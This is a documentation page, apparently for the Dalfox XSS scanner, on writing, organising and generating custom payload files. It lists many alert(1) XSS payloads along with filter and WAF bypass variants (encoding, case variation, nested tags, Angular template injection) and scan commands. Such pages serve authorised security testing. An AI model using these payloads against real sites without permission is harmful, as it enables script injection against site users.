+++
title = "Custom Payloads"
description = "Learn how to create and use custom XSS payloads with Dalfox"
weight = 5
sort_by = "weight"

[extra]
+++

## Basic Usage

**my-payloads.txt:**
```html
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

Add to built-in payloads:
```bash
dalfox scan https://example.com --custom-payload my-payloads.txt
```

Use only custom:
```bash
dalfox scan https://example.com --custom-payload my-payloads.txt --only-custom-payload
```

## Payload Types

**Event Handlers**:
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
```

**JavaScript Protocol**:
```html
<a href="javascript:alert(1)">Click</a>
<iframe src="javascript:alert(1)">
```

**Data URIs**:
```html
<iframe src="data:text/html,<script>alert(1)</script>">
```

**Framework-Specific**:
```html
{{constructor.constructor('alert(1)')()}}  # Angular
<div v-html="'<img src=x onerror=alert(1)>'"></div>  # Vue
```

## Bypass Techniques

**Case Variation**:
```html
<ScRiPt>alert(1)</sCrIpT>
```

**Encoding**:
```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
```

**Attribute Breaking**:
```html
"><script>alert(1)</script>
" onload="alert(1)
```

## Context-Specific

**HTML**: `<script>alert(1)</script>`  
**Attribute**: `" autofocus onfocus=alert(1) x="`  
**JavaScript String**: `';alert(1);//`  
**JavaScript Comment**: `*/alert(1);//`

## Organizing Payloads

**waf-bypass.txt**:
```html
<scr<script>ipt>alert(1)</scr</script>ipt>
```

**framework-specific.txt**:
```html
{{constructor.constructor('alert(1)')()}}
```

**short-payloads.txt**:
```html
<svg onload=alert(1)>
<img src onerror=alert(1)>
```

Combine:
```bash
cat waf-bypass.txt framework-specific.txt short-payloads.txt > all-payloads.txt
dalfox scan https://example.com --custom-payload all-payloads.txt
```

## Remote Payloads

```bash
dalfox scan https://example.com --remote-payloads portswigger,payloadbox
dalfox scan https://example.com --remote-payloads portswigger --custom-payload my-payloads.txt
```

## Generate Payloads

```bash
dalfox payload event-handlers > handlers.txt
dalfox payload useful-tags > tags.txt

for tag in $(cat tags.txt); do
  for handler in $(head -20 handlers.txt); do
    echo "<$tag $handler=alert(1)>"
  done
done > generated.txt

dalfox scan https://example.com --custom-payload generated.txt
```

## Examples

**Length Restriction**:
```bash
echo '<svg/onload=alert(1)>' > short.txt
dalfox scan https://example.com --custom-payload short.txt
```

**Bypass Script Filter**:
```bash
cat > no-script.txt << EOF
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
EOF
dalfox scan https://example.com --custom-payload no-script.txt --only-custom-payload
```

**Angular App**:
```bash
echo '{{constructor.constructor("alert(1)")()}}' > angular.txt
dalfox scan https://angular-app.example.com --custom-payload angular.txt
```

## Resources

- PortSwigger XSS Cheat Sheet
- PayloadBox
- OWASP XSS Filter Evasion
- PayloadsAllTheThings

## See Also

- [Basic XSS Scanning](/usage_guides/basic_xss_scanning) - Getting started
- [Payload Command](/sub-commands/payload) - Payload enumeration
- [Scan Command](/sub-commands/scan) - Complete scanning reference
